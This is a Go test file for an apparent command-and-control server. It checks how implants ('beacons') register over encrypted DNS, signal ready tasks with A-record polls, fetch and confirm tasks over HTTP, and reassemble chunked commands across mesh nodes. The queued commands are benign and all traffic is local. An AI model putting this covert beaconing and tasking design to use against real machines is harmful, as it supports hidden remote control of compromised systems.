package main

import (
	"strconv"
	"strings"
	"testing"
)

// registerMeshBeacon registers a beacon over the DNS path and puts it in A-record poll
// mode, which is the configuration dual mode runs in.
func registerMeshBeacon(t *testing.T, c2 *C2Manager, beaconID string) {
	t.Helper()

	checkIn := "CHK|" + beaconID + "|host1|user1|linux|amd64|1758500000"
	encoded, err := encryptAndEncode(checkIn, c2.aesKey)
	if err != nil {
		t.Fatal(err)
	}

	if _, isC2, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil); !isC2 {
		t.Fatalf("registration for %s was not recognised as C2 traffic", beaconID)
	}

	c2.mutex.Lock()
	beacon, exists := c2.beacons[beaconID]
	if !exists {
		c2.mutex.Unlock()
		t.Fatalf("beacon %s was not registered", beaconID)
	}
	// A-record poll mode: the signal the dual-mode beacon listens for.
	beacon.PhaseConfig = &BeaconPhaseConfig{
		RegQueryType:  "TXT",
		PollQueryType: "A",
		PollACKIP:     "127.0.0.1",
		PollTaskIP:    "127.0.0.2",
	}
	c2.mutex.Unlock()
}

// dnsPoll issues a POLL over the DNS path with the given query type. Type 1 is the
// A-record readiness probe; type 16 is the TXT follow-up that carries the task.
func dnsPoll(t *testing.T, c2 *C2Manager, beaconID string, queryType uint16) string {
	t.Helper()

	encoded, err := encryptAndEncode("POLL|"+beaconID+"|1758500001", c2.aesKey)
	if err != nil {
		t.Fatal(err)
	}

	response, isC2, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, queryType)
	if !isC2 {
		t.Fatal("poll was not recognised as C2 traffic")
	}
	return response
}

// TestDualMode_PeekDoesNotStrandTheTask is the mesh-critical property of dual mode.
//
// An A-record poll reports that work is ready without consuming it. That has to be
// genuinely side-effect free, because in a Shadow Mesh the fetch that follows may land on
// a different node: a peek that marked the task in progress or dequeued it would leave a
// task that no node would deliver again.
func TestDualMode_PeekDoesNotStrandTheTask(t *testing.T) {
	c2 := NewC2Manager(false, "mesh-peek-key", StagerJitter{}, ":memory:", "example.com")
	const beaconID = "meshbeacon"

	registerMeshBeacon(t, c2, beaconID)
	c2.AddTaskFromMaster("T100", beaconID, "whoami")

	// The A-record probe must report readiness.
	if response := dnsPoll(t, c2, beaconID, 1); response != "TASK_PENDING" {
		t.Fatalf("A-record poll = %q, want TASK_PENDING", response)
	}

	// And must have changed nothing that a later delivery depends on.
	c2.mutex.RLock()
	beacon := c2.beacons[beaconID]
	queued := len(beacon.TaskQueue)
	task := c2.tasks["T100"]
	var status string
	if task != nil {
		status = task.Status
	}
	_, inProgress := c2.tasksInProgress["T100"]
	c2.mutex.RUnlock()

	if queued != 1 {
		t.Errorf("peek left %d tasks queued, want 1: the peek consumed it", queued)
	}
	if status != "pending" {
		t.Errorf("task status after peek = %q, want pending", status)
	}
	if inProgress {
		t.Error("peek marked the task in progress, so another node would skip it")
	}

	// A repeated probe stays side-effect free, so a beacon that misses its fetch can ask
	// again.
	if response := dnsPoll(t, c2, beaconID, 1); response != "TASK_PENDING" {
		t.Fatalf("second A-record poll = %q, want TASK_PENDING", response)
	}
}

// TestDualMode_HTTPFetchDeliversAndConsumes asserts the other half: the HTTP request is
// the real delivery, so that is where the task is consumed and reported as sent.
func TestDualMode_HTTPFetchDeliversAndConsumes(t *testing.T) {
	c2 := NewC2Manager(false, "mesh-fetch-key", StagerJitter{}, ":memory:", "example.com")
	const beaconID = "meshbeacon"

	registerMeshBeacon(t, c2, beaconID)
	c2.AddTaskFromMaster("T200", beaconID, "whoami")

	// The signal first, as a dual-mode beacon would.
	if response := dnsPoll(t, c2, beaconID, 1); response != "TASK_PENDING" {
		t.Fatalf("A-record poll = %q, want TASK_PENDING", response)
	}

	// Then the fetch over HTTP.
	response, _, _ := c2.ProcessHTTPMessage("POLL|"+beaconID+"|1758500002", "127.0.0.1", true)
	if !strings.HasPrefix(response, "TASK|") {
		t.Fatalf("HTTP fetch = %q, want a TASK| message", response)
	}
	if !strings.Contains(response, "T200") || !strings.Contains(response, "whoami") {
		t.Fatalf("HTTP fetch = %q, want it to carry the task id and command", response)
	}

	c2.mutex.RLock()
	task := c2.tasks["T200"]
	var status string
	if task != nil {
		status = task.Status
	}
	_, inProgress := c2.tasksInProgress["T200"]
	c2.mutex.RUnlock()

	if status != "sent" {
		t.Errorf("task status after HTTP delivery = %q, want sent", status)
	}
	if !inProgress {
		t.Error("HTTP delivery did not mark the task in progress, so a mesh node would deliver it again")
	}

	// Until the beacon confirms receipt, the task is re-delivered: that is the recovery
	// for a lost response, and it holds over HTTP exactly as it does over DNS.
	redelivered, _, _ := c2.ProcessHTTPMessage("POLL|"+beaconID+"|1758500003", "127.0.0.1", true)
	if !strings.Contains(redelivered, "T200") {
		t.Fatalf("unconfirmed task was not re-delivered over HTTP: %q", redelivered)
	}

	// RESULT_META confirms receipt and clears it, so it is never handed out again.
	confirmed, _, _ := c2.ProcessHTTPMessage("RESULT_META|"+beaconID+"|T200|12|1|1758500004", "127.0.0.1", true)
	if confirmed != "ACK" {
		t.Fatalf("RESULT_META = %q, want ACK", confirmed)
	}

	after, _, _ := c2.ProcessHTTPMessage("POLL|"+beaconID+"|1758500005", "127.0.0.1", true)
	if strings.Contains(after, "T200") {
		t.Fatalf("confirmed task was delivered again: %q", after)
	}
}

// TestDualMode_TXTPollStillDelivers asserts the mechanism the HTTP path depends on: the
// peek gate keys on the A-record query type, so a TXT poll for the same beacon and the
// same task delivers normally. The HTTP path enters the pipeline with TXT semantics for
// exactly this reason.
func TestDualMode_TXTPollStillDelivers(t *testing.T) {
	c2 := NewC2Manager(false, "mesh-txt-key", StagerJitter{}, ":memory:", "example.com")
	const beaconID = "meshbeacon"

	registerMeshBeacon(t, c2, beaconID)
	c2.AddTaskFromMaster("T300", beaconID, "id")

	if response := dnsPoll(t, c2, beaconID, 1); response != "TASK_PENDING" {
		t.Fatalf("A-record poll = %q, want TASK_PENDING", response)
	}

	// The TXT follow-up carries the task, which is what an HTTP fetch must also do.
	response := dnsPoll(t, c2, beaconID, 16)
	if !strings.HasPrefix(response, "TASK|") || !strings.Contains(response, "T300") {
		t.Fatalf("TXT poll = %q, want the task", response)
	}
}

// TestDualMode_ChunkedTaskSurvivesAMeshNodeSwitch asserts a long command can be assembled
// from more than one node, which is what happens when a beacon's HTTP listener fails over
// mid-task.
func TestDualMode_ChunkedTaskSurvivesAMeshNodeSwitch(t *testing.T) {
	// Two managers stand in for two mesh nodes that both received the task from Archon.
	first := NewC2Manager(false, "mesh-chunk-key", StagerJitter{}, ":memory:", "example.com")
	second := NewC2Manager(false, "mesh-chunk-key", StagerJitter{}, ":memory:", "example.com")
	const beaconID = "meshchunk"

	longCommand := strings.Repeat("echo chunked; ", 40) // comfortably over one chunk
	if len(longCommand) <= MaxTaskChunkPayload {
		t.Fatalf("test command is only %d bytes, which does not chunk", len(longCommand))
	}

	for _, c2 := range []*C2Manager{first, second} {
		registerMeshBeacon(t, c2, beaconID)
		c2.AddTaskFromMaster("T400", beaconID, longCommand)
	}

	// The first chunk arrives over HTTP from one node...
	head, _, _ := first.ProcessHTTPMessage("POLL|"+beaconID+"|1758500006", "127.0.0.1", true)
	if !strings.HasPrefix(head, "TASKC|") {
		t.Fatalf("first chunk delivery = %q, want a TASKC| message", head)
	}

	parts := strings.SplitN(head, "|", 4)
	if len(parts) < 4 {
		t.Fatalf("malformed chunk response: %q", head)
	}
	// The header is "<index>/<total>".
	_, totalText, found := strings.Cut(parts[2], "/")
	if !found {
		t.Fatalf("chunk header %q is not <index>/<total>", parts[2])
	}
	totalChunks, err := strconv.Atoi(totalText)
	if err != nil || totalChunks < 2 {
		t.Fatalf("chunk header %q does not describe multiple chunks", parts[2])
	}
	assembled := parts[3]

	// ...and the rest from the other node, as a listener failover would.
	for index := 2; index <= totalChunks; index++ {
		request := "TASKGET|" + beaconID + "|T400|" + strconv.Itoa(index)
		chunk, _, _ := second.ProcessHTTPMessage(request, "127.0.0.1", true)

		chunkParts := strings.SplitN(chunk, "|", 4)
		if len(chunkParts) < 4 || chunkParts[0] != "TASKC" || chunkParts[1] != "T400" {
			t.Fatalf("chunk %d from the second node = %q, want a TASKC| message for T400", index, chunk)
		}
		assembled += chunkParts[3]
	}

	if assembled != longCommand {
		t.Fatalf("assembled command does not match: got %d bytes, want %d", len(assembled), len(longCommand))
	}
}
